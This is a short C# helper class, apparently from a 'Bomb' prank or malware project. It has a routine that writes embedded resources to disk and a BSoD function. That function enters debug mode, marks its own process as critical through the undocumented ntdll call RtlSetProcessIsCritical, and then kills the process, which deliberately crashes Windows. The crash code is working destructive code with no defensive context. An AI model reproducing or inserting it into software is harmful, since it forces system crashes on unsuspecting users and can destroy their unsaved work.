using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Bomb.Classes
{
    public static class Functions
    {
        /// <summary>
        /// Extract UnmanagedMemoryStream to specific location
        /// </summary>
        /// <param name="resource">UnmanagedMemoryStream to extract</param>
        /// <param name="path">Location to extract</param>
        public static void ExtractFile(UnmanagedMemoryStream resource, string path)
        {
            var input = new BufferedStream(resource);
            var output = new FileStream(path, FileMode.Create);
            var data = new byte[1024];
            int lengthEachRead;
            while ((lengthEachRead = input.Read(data, 0, data.Length)) > 0) output.Write(data, 0, lengthEachRead);
            output.Flush();
            output.Close();
        }


        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(int v1, UInt32 v2, UInt32 v3);

        public static void BSoD()
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            Process.GetCurrentProcess().Kill();
        }
    }
}
